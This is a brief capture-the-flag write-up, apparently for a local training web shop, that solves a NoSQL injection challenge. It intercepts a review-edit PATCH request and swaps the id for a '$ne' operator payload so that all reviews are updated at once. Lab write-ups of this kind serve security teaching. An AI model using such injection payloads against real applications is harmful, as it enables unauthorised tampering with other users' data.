# NoSQLManipulation

This challenge involves exploiting a NoSQL injection vulnerability to update multiple product reviews simultaneously in a NoSQL database.

First we need to log in as a admin, and click one of the reviews and try to edit it. Change the string(whatever) and turn on your intercept. You will see the PATCH request from this website like this.

```bash
PATCH /rest/products/reviews HTTP/1.1
Host: localhost:3000

{
  "id": "specific_review_id",
  "message": "updated_review_text"
}
```

![alt text](<img/Screenshot (24).png>)

Change the id into like this `"id": {"$ne:null"}` and send it, We will saw all the reviews

![alt text](<img/Screenshot (25).png>)

Solved!

![alt text](<img/Screenshot (26).png>)